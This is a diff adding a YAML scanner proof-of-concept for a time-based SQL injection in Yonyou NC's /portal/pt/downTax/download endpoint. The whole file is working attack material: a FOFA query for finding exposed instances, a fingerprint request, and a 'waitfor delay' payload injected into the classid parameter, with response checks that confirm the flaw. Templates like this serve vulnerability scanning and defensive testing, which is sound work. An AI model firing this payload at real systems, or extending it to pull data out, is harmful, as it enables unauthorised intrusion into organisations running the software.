@@ -1,0 +1,29 @@
+id: poc-yaml-yongyou-nc-download-sqli
+info:
+  name: 用友 NC download SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /index.jsp
+  expression: status_code == 200 && contains(body,"<TITLE>Yonyou NC</TITLE>")
+- method: GET
+  path: /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:{{.t1}}'--
+  expression: 'status_code == 500 &&
+
+    contains(body,"<title>Error</title>") &&
+
+    contains(body,"没有下载到数据") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
